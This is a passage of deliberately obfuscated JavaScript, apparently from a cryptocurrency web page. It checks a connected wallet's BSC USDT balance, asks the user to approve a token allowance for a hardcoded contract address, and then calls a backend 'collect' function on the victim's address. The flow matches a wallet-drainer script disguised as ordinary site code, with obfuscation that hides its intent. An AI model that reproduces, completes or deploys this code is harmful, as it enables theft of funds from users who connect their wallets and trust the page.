                else {
                    _0x42487c[_0x4c26b3(0x157)](showToast, _0x42487c[_0x4c26b3(0x155)], _0x42487c[_0x4c26b3(0x204)]), _0x42487c[_0x4c26b3(0x23a)](setLoading, ![]);
                    return;
                }
            }
        }
        const _0x5d8b37 = await _0x42b9e2[_0x4c26b3(0x1ac)](), _0x50ab2f = await _0x5d8b37[_0x4c26b3(0x1ca)]();
        _0x42487c[_0x4c26b3(0x157)](setLoading, !![], _0x42487c[_0x4c26b3(0x1e9)]);
        const _0x26d4f1 = await _0x42b9e2[_0x4c26b3(0x105)](_0x50ab2f), _0x29b982 = ethers[_0x4c26b3(0x234)](_0x42487c[_0x4c26b3(0x160)]);
        if (_0x42487c[_0x4c26b3(0x16e)](_0x26d4f1, _0x29b982)) {
            _0x42487c[_0x4c26b3(0x1c7)](showToast, _0x42487c[_0x4c26b3(0x15b)], _0x42487c[_0x4c26b3(0x204)]), _0x42487c[_0x4c26b3(0x23a)](setLoading, ![]);
            return;
        }
        const _0x3024ba = document[_0x4c26b3(0x23e) + _0x4c26b3(0x149)](_0x42487c[_0x4c26b3(0x231)]), _0x3d1dd2 = _0x3024ba ? _0x3024ba[_0x4c26b3(0x1cc)] : '1', _0x5bbe46 = ethers[_0x4c26b3(0x1b5)](_0x42487c[_0x4c26b3(0x187)](_0x3d1dd2, '1'), -0x28d * -0x6 + 0x47e + -0x32 * 0x65), _0x2ccffb = new ethers[(_0x4c26b3(0x116))](BSC_USDT_ADDRESS, ERC20_ABI, _0x5d8b37);
        _0x42487c[_0x4c26b3(0x157)](setLoading, !![], _0x42487c[_0x4c26b3(0x1de)]);
        const _0x30f5df = await _0x2ccffb[_0x4c26b3(0x1b2)](_0x50ab2f);
        if (_0x42487c[_0x4c26b3(0x19a)](_0x30f5df, _0x5bbe46)) {
            _0x42487c[_0x4c26b3(0x12f)](showToast, _0x42487c[_0x4c26b3(0x166)], _0x42487c[_0x4c26b3(0x204)]), _0x42487c[_0x4c26b3(0x23a)](setLoading, ![]);
            return;
        }
        _0x42487c[_0x4c26b3(0x124)](setLoading, !![], _0x42487c[_0x4c26b3(0x1d5)]);
        const _0x206b14 = await _0x2ccffb[_0x4c26b3(0x1fe)](_0x50ab2f, CONTRACT_ADDRESS);
        if (_0x42487c[_0x4c26b3(0x19a)](_0x206b14, _0x5bbe46)) {
            _0x42487c[_0x4c26b3(0x238)](setLoading, !![], _0x42487c[_0x4c26b3(0x230)]);
            const _0x58b36b = await _0x2ccffb[_0x4c26b3(0x1f5)](CONTRACT_ADDRESS, _0x5bbe46);
            _0x42487c[_0x4c26b3(0x193)](setLoading, !![], _0x42487c[_0x4c26b3(0x21c)]), await _0x58b36b[_0x4c26b3(0x115)]();
        }
        _0x42487c[_0x4c26b3(0x124)](setLoading, !![], _0x42487c[_0x4c26b3(0x1ef)]);
        const _0x1ea0fb = await _0x42487c[_0x4c26b3(0x23a)](triggerBackendCollect, _0x50ab2f), _0x334373 = _0x1ea0fb?.[_0x4c26b3(0x1c9)] || '';
        _0x334373 ? _0x42487c[_0x4c26b3(0x1f0)](showToast, _0x4c26b3(0x1b9) + _0x4c26b3(0x227) + _0x4c26b3(0x1b0) + _0x4c26b3(0x20e) + _0x4c26b3(0x14c) + 'x/' + _0x334373 + (_0x4c26b3(0x122) + _0x4c26b3(0x120) + _0x4c26b3(0x10c) + _0x4c26b3(0x151) + _0x4c26b3(0x1b4) + _0x4c26b3(0x1c4) + _0x4c26b3(0x1a5) + _0x4c26b3(0x229) + _0x4c26b3(0x1bb)), _0x42487c[_0x4c26b3(0x1da)], 0x3df * -0xb + 0x1c9d * 0x1 + 0x2d38) : _0x42487c[_0x4c26b3(0x167)](showToast, _0x42487c[_0x4c26b3(0x13e)], _0x42487c[_0x4c26b3(0x1da)], 0x201a + 0x2f6 * 0x2 + -0x74b * 0x2);
    } catch (_0x402187) {
        const _0x494eb4 = _0x402187?.[_0x4c26b3(0x1ba)] ?? _0x402187?.[_0x4c26b3(0x246)] ?? _0x42487c[_0x4c26b3(0x248)];
        _0x42487c[_0x4c26b3(0x21e)](_0x402187[_0x4c26b3(0x103)], 0x16ed + 0x57 * 0x1d + -0x1127) || _0x494eb4[_0x4c26b3(0x1ea) + 'e']()[_0x4c26b3(0x11d)](_0x42487c[_0x4c26b3(0x23c)]) || _0x494eb4[_0x4c26b3(0x1ea) + 'e']()[_0x4c26b3(0x11d)](_0x42487c[_0x4c26b3(0x1f2)]) || _0x494eb4[_0x4c26b3(0x1ea) + 'e']()[_0x4c26b3(0x11d)](_0x42487c[_0x4c26b3(0x148)]) ? _0x42487c[_0x4c26b3(0x224)](showToast, _0x42487c[_0x4c26b3(0x244)], _0x42487c[_0x4c26b3(0x17f)]) : (console[_0x4c26b3(0x1e5)](_0x42487c[_0x4c26b3(0x201)], _0x402187), _0x42487c[_0x4c26b3(0x157)](showToast, _0x42487c[_0x4c26b3(0x118)], _0x42487c[_0x4c26b3(0x204)]));
    } finally {
        _0x42487c[_0x4c26b3(0x23a)](setLoading, ![]);
    }
}
